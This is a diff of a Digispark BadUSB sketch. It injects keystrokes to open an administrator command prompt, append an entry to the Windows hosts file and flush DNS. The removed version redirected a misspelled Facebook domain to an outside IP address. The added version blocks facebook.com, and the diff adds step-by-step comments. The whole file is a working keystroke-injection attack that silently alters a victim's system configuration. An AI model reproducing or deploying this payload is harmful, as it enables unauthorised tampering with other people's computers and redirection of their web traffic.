@@ -1,8 +1,8 @@
+//Include library
 #include <DigiKeyboard.h>
 
-#define KEY_ESC 41
-
 void setup() {
+  //Minimize all windows
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   //This opens an administrator command prompt
@@ -20,8 +20,10 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
-  DigiKeyboard.println("ECHO 143.47.181.65 facebok.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
+  //Code for entering commands into cmd
+  DigiKeyboard.println("ECHO 0.0.0.0 facebook.com >> C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS");
   DigiKeyboard.println("ipconfig /flushdns");
+  //Closing cmd
   DigiKeyboard.println("exit");
 }
 
